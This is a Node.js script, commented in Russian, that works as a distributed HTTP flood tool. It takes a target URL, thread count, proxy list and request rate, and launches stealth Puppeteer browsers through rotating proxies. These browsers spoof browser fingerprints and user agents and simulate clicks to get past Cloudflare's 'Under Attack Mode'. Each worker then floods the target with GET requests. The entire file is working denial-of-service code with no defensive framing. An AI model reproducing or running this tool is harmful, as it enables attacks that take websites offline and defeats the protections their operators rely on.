const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');

// Генерация случайных User-Agent
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/118.0'
];

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

puppeteer.use(StealthPlugin());

if (isMainThread) {
    const targetUrl = process.argv[2];
    const threads = parseInt(process.argv[3]);
    const proxyFile = process.argv[4];
    const rate = parseInt(process.argv[5]);

    const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);

    for (let i = 0; i < threads; i++) {
        new Worker(__filename, {
            workerData: { targetUrl, proxy: proxies[i % proxies.length], rate }
        });
    }
} else {
    const { targetUrl, proxy, rate } = workerData;

    (async () => {
        const browser = await puppeteer.launch({
            headless: false,
            args: [
                `--proxy-server=${proxy}`,
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--no-sandbox'
            ]
        });

        const page = await browser.newPage();
        await page.setUserAgent(getRandomUserAgent());

        // Подмена фингерпринта
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        });

        // Имитация поведения
        await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 60000 });
        await page.mouse.move(100, 100);
        await page.mouse.click(100, 100);

        // Флуд после прохождения UAM
        setInterval(() => {
            axios.get(targetUrl, {
                proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] },
                headers: { 'User-Agent': getRandomUserAgent() }
            }).catch(() => {});
        }, 1000 / rate);
    })();
}
